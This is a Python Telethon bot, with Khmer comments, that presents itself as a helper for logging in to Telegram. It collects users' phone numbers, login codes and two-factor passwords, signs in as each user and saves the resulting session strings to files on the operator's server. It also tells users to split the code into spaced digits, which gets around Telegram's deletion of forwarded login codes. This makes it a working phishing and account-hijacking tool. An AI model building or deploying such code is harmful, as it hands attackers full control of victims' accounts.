"""
Telegram Login Bot — អ្នកប្រើ chat ជាមួយ bot ដើម្បី login ចូល
account Telegram ផ្ទាល់ខ្លួនរបស់ពួកគេ។ Bot ប្រើ Telethon ដើម្បី
ផ្ញើ code តាម Telegram រួច verify ។
"""
import os
import asyncio
import logging
from telethon import TelegramClient, events, Button
from telethon.sessions import StringSession
from telethon.errors import (
    PhoneCodeInvalidError,
    PhoneCodeExpiredError,
    SessionPasswordNeededError,
    PhoneNumberInvalidError,
    FloodWaitError,
)

logging.basicConfig(level=logging.INFO, format="%(asctime)s %(levelname)s %(message)s")
log = logging.getLogger("loginbot")

API_ID = int(os.environ["TELEGRAM_API_ID"])
API_HASH = os.environ["TELEGRAM_API_HASH"]
BOT_TOKEN = os.environ["TELEGRAM_BOT_TOKEN"]

# Directory ទុក sessions របស់អ្នកប្រើប្រាស់ (StringSessions ជាឯកសារ)
SESSIONS_DIR = "user_sessions"
os.makedirs(SESSIONS_DIR, exist_ok=True)

bot = TelegramClient("bot", API_ID, API_HASH)

# State per Telegram user_id
# { user_id: {"step": ..., "client": TelegramClient, "phone": str, "phone_code_hash": str} }
STATE: dict[int, dict] = {}


def save_session(user_id: int, string_session: str):
    with open(os.path.join(SESSIONS_DIR, f"{user_id}.session"), "w") as f:
        f.write(string_session)


async def cleanup(user_id: int):
    st = STATE.pop(user_id, None)
    if st and st.get("client"):
        try:
            await st["client"].disconnect()
        except Exception:
            pass


@bot.on(events.NewMessage(pattern=r"^/start$"))
async def start(event):
    uid = event.sender_id
    await cleanup(uid)
    await event.reply(
        "👋 **សួស្តី!**\n\n"
        "📱 សូមបញ្ចូលលេខទូរស័ព្ទរបស់អ្នកជាមួយកូដប្រទេស\n"
        "_(ឧ. `+855xxxxxxxx`)_\n\n"
        "វាយ /cancel ដើម្បីបោះបង់",
        parse_mode="md",
    )
    STATE[uid] = {"step": "phone"}


@bot.on(events.NewMessage(pattern=r"^/cancel$"))
async def cancel(event):
    await cleanup(event.sender_id)
    await event.reply("❌ បានបោះបង់។ វាយ /start ដើម្បីចាប់ផ្ដើមម្ដងទៀត។")


@bot.on(events.NewMessage(pattern=r"^/logout$"))
async def logout(event):
    uid = event.sender_id
    path = os.path.join(SESSIONS_DIR, f"{uid}.session")
    if os.path.exists(path):
        os.remove(path)
        await event.reply("🗑️ Session ត្រូវបានលុបហើយ។")
    else:
        await event.reply("ℹ️ អ្នកមិនមាន session ដែលបានរក្សាទុកនោះទេ។")


@bot.on(events.NewMessage(func=lambda e: e.is_private and not (e.raw_text or "").startswith("/")))
async def flow(event):
    uid = event.sender_id
    st = STATE.get(uid)
    if not st:
        await event.reply("សូមវាយ /start ដើម្បីចាប់ផ្តើម។")
        return

    text = (event.raw_text or "").strip()

    # --- ជំហានទី 1: លេខទូរស័ព្ទ ---
    if st["step"] == "phone":
        phone = text.replace(" ", "")
        if not phone.startswith("+") or not phone[1:].isdigit():
            await event.reply("⚠️ ទម្រង់មិនត្រឹមត្រូវ។ សូមបញ្ចូលដូច `+855xxxxxxxx`", parse_mode="md")
            return

        user_client = TelegramClient(StringSession(), API_ID, API_HASH)
        await user_client.connect()
        try:
            sent = await user_client.send_code_request(phone)
        except PhoneNumberInvalidError:
            await event.reply("⚠️ លេខទូរស័ព្ទមិនត្រឹមត្រូវ។ សូមព្យាយាមម្តងទៀត ឬ /cancel")
            await user_client.disconnect()
            return
        except FloodWaitError as e:
            await event.reply(f"⏳ ត្រូវរង់ចាំ {e.seconds} វិនាទីមុននឹងសាកម្តងទៀត។")
            await user_client.disconnect()
            await cleanup(uid)
            return
        except Exception as e:
            log.exception("send_code_request failed")
            await event.reply(f"❌ កំហុស៖ `{e}`", parse_mode="md")
            await user_client.disconnect()
            await cleanup(uid)
            return

        st.update(
            step="code",
            client=user_client,
            phone=phone,
            phone_code_hash=sent.phone_code_hash,
        )
        await event.reply(
            "✉️ Telegram បានផ្ញើ **code** ទៅកាន់ app Telegram របស់អ្នក។\n\n"
            "សូមបញ្ចូល code នៅទីនេះ (ឧ. `12345`)។\n"
            "_ដើម្បីការពារ Telegram មិនលុប code សូមបំបែកតួអក្សរ ឧ. `1 2 3 4 5`_",
            parse_mode="md",
        )
        return

    # --- ជំហានទី 2: Code ---
    if st["step"] == "code":
        code = "".join(ch for ch in text if ch.isdigit())
        if not code:
            await event.reply("⚠️ សូមបញ្ចូល code ជាលេខ។")
            return
        client: TelegramClient = st["client"]
        try:
            await client.sign_in(
                phone=st["phone"],
                code=code,
                phone_code_hash=st["phone_code_hash"],
            )
        except SessionPasswordNeededError:
            st["step"] = "password"
            await event.reply("🔒 Account របស់អ្នកបើក 2FA។ សូមបញ្ចូលពាក្យសម្ងាត់។")
            return
        except PhoneCodeInvalidError:
            await event.reply("⚠️ Code ខុស។ សាកម្តងទៀត ឬ /cancel")
            return
        except PhoneCodeExpiredError:
            await event.reply("⚠️ Code ផុតកំណត់។ សូមវាយ /start ម្តងទៀត។")
            await cleanup(uid)
            return
        except Exception as e:
            log.exception("sign_in failed")
            await event.reply(f"❌ កំហុស៖ `{e}`", parse_mode="md")
            await cleanup(uid)
            return

        await finish_login(event, uid)
        return

    # --- ជំហានទី 3: 2FA password ---
    if st["step"] == "password":
        client: TelegramClient = st["client"]
        try:
            await client.sign_in(password=text)
        except Exception as e:
            await event.reply(f"⚠️ ពាក្យសម្ងាត់ខុស ឬកំហុស៖ `{e}`\nសាកម្តងទៀត ឬ /cancel", parse_mode="md")
            return
        await finish_login(event, uid)
        return


async def finish_login(event, uid: int):
    st = STATE.get(uid)
    if not st:
        return
    client: TelegramClient = st["client"]
    me = await client.get_me()
    string = client.session.save()
    save_session(uid, string)
    await client.disconnect()
    STATE.pop(uid, None)
    await event.reply(
        f"✅ **Login ជោគជ័យ!**\n\n"
        f"👤 {me.first_name or ''} {me.last_name or ''}\n"
        f"Username: @{me.username or '—'}\n"
        f"ID: `{me.id}`\n\n"
        f"Session ត្រូវបានរក្សាទុករួច។ វាយ /logout ដើម្បីលុប។",
        parse_mode="md",
    )


async def main():
    await bot.start(bot_token=BOT_TOKEN)
    me = await bot.get_me()
    print(f"✅ Login bot started as: @{me.username} (id={me.id})")
    print("Open the bot in Telegram and send /start")
    await bot.run_until_disconnected()


if __name__ == "__main__":
    asyncio.run(main())
